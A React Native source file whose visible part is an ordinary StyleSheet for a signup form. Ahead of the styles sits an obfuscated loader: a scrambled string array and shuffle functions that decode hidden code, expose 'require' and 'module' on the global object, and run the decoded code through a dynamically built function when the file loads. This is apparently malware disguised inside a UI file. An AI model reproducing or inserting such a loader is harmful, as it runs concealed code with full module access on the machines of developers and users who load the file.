n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
// ---------- styles ----------
const styles = StyleSheet.create({
  container: { padding: 16, paddingTop: 60, paddingBottom: 40 },
  title: { fontSize: 28, fontWeight: "800", color: "#1f2937" },
  subtitle: { color: "#6b7280", marginBottom: 16 },

  card: {
    backgroundColor: "#fff",
    borderRadius: 14,
    padding: 16,
    marginBottom: 16,
    elevation: 2,
    shadowColor: "#000",
    shadowOpacity: 0.06,
    shadowRadius: 6,
    shadowOffset: { width: 0, height: 2 },
  },
  section: { fontSize: 17, fontWeight: "700", marginBottom: 12, color: "#111827" },

  field: { marginBottom: 14 },
  label: { fontWeight: "600", marginBottom: 6, color: "#374151" },
  input: {
    borderWidth: 1,
    borderColor: "#d1d5db",
    borderRadius: 8,
    paddingHorizontal: 12,
    paddingVertical: 10,
    backgroundColor: "#fafafa",
  },
  inputError: { borderColor: "#dc2626", backgroundColor: "#fef2f2" },
  error: { color: "#dc2626", fontSize: 12, marginTop: 4 },
  hint: { color: "#9ca3af", fontSize: 12, marginTop: 4 },

  pickerBox: {
    borderWidth: 1,
    borderColor: "#d1d5db",
    borderRadius: 8,
    backgroundColor: "#fafafa",
    overflow: "hidden",
  },

  passwordRow: { flexDirection: "row", alignItems: "center" },
  showBtn: { marginLeft: 8, padding: 8 },
  showBtnText: { color: "#4f46e5", fontWeight: "600" },
  meterTrack: {
    height: 6,
    borderRadius: 3,
    backgroundColor: "#e5e7eb",
    marginBottom: 4,
  },

  rowWrap: { flexDirection: "row", flexWrap: "wrap", gap: 8 },
  radioRow: { flexDirection: "row", alignItems: "center", marginRight: 16 },
  radio: {
    width: 20,
    height: 20,
    borderRadius: 10,
    borderWidth: 2,
    borderColor: "#4f46e5",
    marginRight: 6,
    alignItems: "center",
    justifyContent: "center",
  },
  radioDot: {
    width: 10,
    height: 10,
    borderRadius: 5,
    backgroundColor: "#4f46e5",
  },

  chip: {
    borderWidth: 1,
    borderColor: "#c7d2fe",
    borderRadius: 20,
    paddingHorizontal: 14,
    paddingVertical: 6,
  },
  chipSelected: { backgroundColor: "#4f46e5", borderColor: "#4f46e5" },
  chipText: { color: "#4f46e5" },
  chipTextSelected: { color: "#fff" },

  switchRow: { flexDirection: "row", alignItems: "center" },

  submitBtn: {
    backgroundColor: "#4f46e5",
    padding: 14,
    borderRadius: 10,
    alignItems: "center",
  },
  submitText: { color: "#fff", fontWeight: "700", fontSize: 16 },
  resetBtn: { padding: 14, alignItems: "center" },
  resetText: { color: "#6b7280", fontWeight: "600" },

  success: {
    backgroundColor: "#dcfce7",
    borderRadius: 10,
    padding: 12,
    marginBottom: 16,
  },
  successText: { color: "#166534" },
});